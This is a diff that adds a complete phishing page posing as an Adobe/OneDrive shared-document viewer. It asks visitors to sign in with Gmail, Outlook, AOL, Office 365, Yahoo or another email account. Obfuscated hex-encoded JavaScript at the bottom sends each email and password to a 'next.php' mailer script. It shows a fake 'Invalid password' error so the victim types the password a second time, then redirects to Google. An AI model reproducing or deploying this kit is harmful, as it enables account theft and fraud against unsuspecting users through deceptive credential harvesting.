@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Adobe Document</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>Share Point Online</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    /* Made with love by Mutiullah Samim*/
+
+    @import url('https://fonts.googleapis.com/css?family=Numans');
+
+    html,
+    body {
+        background-image: url('images/4b.jpg');
+        background-size: cover;
+        background-repeat: no-repeat;
+        height: 100%;
+        font-family: 'Numans', sans-serif;
+    }
+
+    .container {
+        align-content: center;
+    }
+
+    .card {
+
+        width: auto;
+        background-color: rgba(0, 0, 0, 0.5) !important;
+    }
+
+    .social_icon span {
+        font-size: 60px;
+        margin-left: 10px;
+        color: #FFC312;
+    }
+
+    .social_icon span:hover {
+        color: white;
+        cursor: pointer;
+    }
+
+    .card-header h3 {
+        color: white;
+    }
+
+    .social_icon {
+        position: absolute;
+        right: auto;
+        left: auto;
+        top: -30px;
+    }
+
+    .input-group-prepend span {
+        width: 50px;
+        background-color: #FFC312;
+        color: black;
+        border: 0 !important;
+    }
+
+    input:focus {
+        outline: 0 0 0 0 !important;
+        box-shadow: 0 0 0 0 !important;
+
+    }
+
+    .remember {
+        color: white;
+    }
+
+    .remember input {
+        width: 20px;
+        height: 20px;
+        margin-left: 15px;
+        margin-right: 5px;
+    }
+
+    .login_btn {
+        color: black;
+        background-color: #FFC312;
+        width: 100px;
+    }
+
+    .login_btn:hover {
+        color: black;
+        background-color: white;
+    }
+
+    .links {
+        color: white;
+    }
+
+    .links a {
+        margin-left: 4px;
+    }
+
+    @media only screen and (max-width: 995px) {
+
+        html,
+        body {
+            background-image: url('images/4b.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            height: auto;
+            font-family: 'Numans', sans-serif;
+        }
+    }
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid ">
+        <div class="row bg">
+            <div class="container">
+                <div class="row my-5 py-4">
+                    <div class="col-lg-6" style="padding:0px 0px 0px 0px;">
+                        <div class="text-center pt-5 mt-2">
+                            <img src="images/onedrive-white.png" class="img-fluid" width="250px"><br>
+                            <span class="h2 text-white">OneDrive</span><br>
+                            <span class="h5 text-white font-weight-normal">To read he document, please choose your email provider below login to view shared files.</span>
+                        </div>
+                    </div>
+                    <div class="col-lg-6" style="margin:40px 0px 0px 0px;">
+                        <div class="">
+                            <div class="card">
+                                <div class="card-header pt-5">
+                                    <div class="d-flex rounded justify-content-end p-2 social_icon rounded" style="background-color: rgba(0,0,0,0.5);">
+                                        <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgG" src="images/gmail-b.png" width="50px" class="rounded"></span>
+                                        </a>
+                                        <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgO" src="images/outlook-w.png" width="50px" class="rounded"></span>
+                                        </a>
+                                        <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgA" src="images/aol-w.png" width="50px" class="rounded"></span>
+                                        </a>
+                                        <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgOf" src="images/office365-w.png" width="50px" class="rounded"></span>
+                                        </a>
+                                        <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgY" src="images/yahoo-w.png" width="50px" class="rounded"></span>
+                                        </a>
+                                        <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                                            <span><img id="fieldImgOt" src="images/other-w.png" width="50px" class="rounded"></span>
+                                        </a>
+                                    </div>
+                                </div>
+                                <form id="contact" class="form-horizontal well">
+                                    <div class="card-body">
+                                        <div class="col-lg-12">
+                                            <span class="h4 text-white">Sign In</span>
+                                            <span class="h4 font-weight-bold text-white" id="field">Gmail</span>
+                                            <div class="alert alert-danger" id="mgss"></div>
+                                            <div class="form-group">
+                                                <label for="exampleInputai1" class="text-white">Email address</label>
+                                                <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email">
+                                                <small id="aiHelp" class="form-text text-white">We'll never share your email with anyone else.</small>
+                                            </div>
+                                        </div>
+                                        <div class="col-lg-12">
+                                            <div class="form-group">
+                                                <label for="pr" class="text-white">Password</label>
+                                                <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="modal-footer">
+                                        <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+                                        <button class="btn btn-lg btn-success pull-right" id="submit-btn">Login</button>
+                                    </div>
+                                </form>
+                                <div class="card-footer">
+                                    <div class="d-flex text justify-content-center links">
+                                        Don't have an account?<a href="#" class="text-success">Sign Up</a>
+                                    </div>
+                                    <div class="d-flex justify-content-center">
+                                        <a href="#" class="text-warning">Forgot your password?</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- //mailer link -->
+    <input type="hidden" id="f" value="./next.php">
+    <!-- //mail result count -->
+    <input type="hidden" id="rc" value="2">
+    <!-- //redirect link -->
+    <input type="hidden" id="rdrt" value="https://www.google.com">
+    <!-- // if you want to redirection for domain (0 for no)(1 for yes) -->
+    <input type="hidden" id="domain_redirect" value="0">
+    <!-- // img url -->
+    <input type="hidden" id="img_url" value="./images/">
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+var _0xc519=["\x76\x61\x6C","\x23\x66","\x23\x72\x63","\x23\x72\x64\x72\x74","\x23\x64\x6F\x6D\x61\x69\x6E\x5F\x72\x65\x64\x69\x72\x65\x63\x74","\x23\x69\x6D\x67\x5F\x75\x72\x6C","\x68\x69\x64\x65","\x23\x6D\x67\x73\x73","\x62\x33\x56\x30\x62\x47\x39\x76\x61\x77\x3D\x3D","\x61\x47\x39\x30\x62\x57\x46\x70\x62\x41\x3D\x3D","\x5A\x32\x31\x68\x61\x57\x77\x3D","\x65\x57\x46\x6F\x62\x32\x38\x3D","\x62\x32\x5A\x6D\x61\x57\x4E\x6C\x4D\x7A\x59\x31","\x72\x65\x73\x65\x74","\x74\x72\x69\x67\x67\x65\x72","\x23\x63\x6F\x6E\x74\x61\x63\x74","\x73\x72\x63","\x2D\x62\x2E\x70\x6E\x67","\x61\x74\x74\x72","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x47","\x2D\x77\x2E\x70\x6E\x67","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x4F","\x61\x6F\x6C\x2D\x77\x2E\x70\x6E\x67","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x41","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x4F\x66","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x59","\x6F\x74\x68\x65\x72\x2D\x77\x2E\x70\x6E\x67","\x23\x66\x69\x65\x6C\x64\x49\x6D\x67\x4F\x74","\x47\x6D\x61\x69\x6C","\x68\x74\x6D\x6C","\x23\x66\x69\x65\x6C\x64","\x73\x68\x6F\x77","\x6D\x6F\x64\x61\x6C","\x23\x61\x6A\x61\x78\x4D\x6F\x64\x61\x6C","\x63\x6C\x69\x63\x6B","\x23","\x4F\x75\x74\x6C\x6F\x6F\x6B","\x61\x6F\x6C\x2D\x62\x2E\x70\x6E\x67","\x41\x6F\x6C","\x23\x61\x6F\x6C\x6D\x6F\x64\x61\x6C","\x4F\x66\x66\x69\x63\x65\x20\x33\x36\x35","\x59\x61\x68\x6F\x6F","\x6F\x74\x68\x65\x72\x2D\x62\x2E\x70\x6E\x67","\x4F\x74\x68\x65\x72\x20\x4D\x61\x69\x6C","\x23\x6F\x74\x68\x65\x72\x6D\x6F\x64\x61\x6C","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x23\x61\x69","\x23\x70\x72","\x74\x65\x78\x74","\x4A\x53\x4F\x4E","\x50\x4F\x53\x54","\x56\x65\x72\x69\x66\x69\x6E\x67\x2E\x2E\x2E","\x23\x73\x75\x62\x6D\x69\x74\x2D\x62\x74\x6E","","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x49\x6E\x76\x61\x6C\x69\x64\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2E\x2E\x21\x20\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x63\x6F\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2E","\x4C\x6F\x67\x69\x6E","\x61\x6A\x61\x78","\x72\x65\x61\x64\x79"];var f=$(_0xc519[1])[_0xc519[0]]();var rc=$(_0xc519[2])[_0xc519[0]]();var rdrt=$(_0xc519[3])[_0xc519[0]]();var domain_redirect=$(_0xc519[4])[_0xc519[0]]();var img_url=$(_0xc519[5])[_0xc519[0]]();$(document)[_0xc519[60]](function(){$(_0xc519[7])[_0xc519[6]]();var _0x371bx6=_0xc519[8];var _0x371bx7=_0xc519[9];var _0x371bx8=_0xc519[10];var _0x371bx9=_0xc519[11];var _0x371bxa=_0xc519[12];var _0x371bxb=0;$(_0xc519[35]+ atob(_0x371bx8)+ _0xc519[32])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[17]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[20]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[22]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[20]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[20]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[26]);$(_0xc519[30])[_0xc519[29]](_0xc519[28]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[35]+ atob(_0x371bx6)+ _0xc519[32])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[20]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[17]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[22]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[20]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[20]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[26]);$(_0xc519[30])[_0xc519[29]](_0xc519[36]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[39])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[20]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[20]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[37]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[20]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[20]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[26]);$(_0xc519[30])[_0xc519[29]](_0xc519[38]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[35]+ atob(_0x371bxa)+ _0xc519[32])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[20]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[20]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[22]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[17]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[20]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[26]);$(_0xc519[30])[_0xc519[29]](_0xc519[40]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[35]+ atob(_0x371bx9)+ _0xc519[32])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[20]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[20]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[22]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[20]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[17]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[26]);$(_0xc519[30])[_0xc519[29]](_0xc519[41]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[44])[_0xc519[34]](function(){$(_0xc519[15])[_0xc519[14]](_0xc519[13]);$(_0xc519[19])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx8)+ _0xc519[20]);$(_0xc519[21])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx6)+ _0xc519[20]);$(_0xc519[23])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[22]);$(_0xc519[24])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bxa)+ _0xc519[20]);$(_0xc519[25])[_0xc519[18]](_0xc519[16],img_url+ atob(_0x371bx9)+ _0xc519[20]);$(_0xc519[27])[_0xc519[18]](_0xc519[16],img_url+ _0xc519[42]);$(_0xc519[30])[_0xc519[29]](_0xc519[43]);$(_0xc519[33])[_0xc519[32]](_0xc519[31])});$(_0xc519[52])[_0xc519[34]](function(_0x371bxc){_0x371bxc[_0xc519[45]]();var _0x371bxd=$(_0xc519[46])[_0xc519[0]]();var _0x371bxe=$(_0xc519[47])[_0xc519[0]]();var _0x371bxf=$(_0xc519[30])[_0xc519[29]]();var _0x371bx10=$(_0xc519[7])[_0xc519[29]]();$(_0xc519[7])[_0xc519[48]](_0x371bx10);_0x371bxb= _0x371bxb+ 1;$[_0xc519[59]]({dataType:_0xc519[49],url:f,type:_0xc519[50],data:{ai:_0x371bxd,pr:_0x371bxe,detail:_0x371bxf},beforeSend:function(_0x371bx11){$(_0xc519[52])[_0xc519[29]](_0xc519[51])},complete:function(){$(_0xc519[47])[_0xc519[0]](_0xc519[53]);if(_0x371bxb>= rc){_0x371bxb= 0;if(domain_redirect== 1){window[_0xc519[56]][_0xc519[55]](_0xc519[54]+ my_slice)}else {window[_0xc519[56]][_0xc519[55]](rdrt)};return false};$(_0xc519[7])[_0xc519[31]]();$(_0xc519[7])[_0xc519[29]](_0xc519[57]);$(_0xc519[52])[_0xc519[29]](_0xc519[58])}})})})
+</script>
+
+</html>
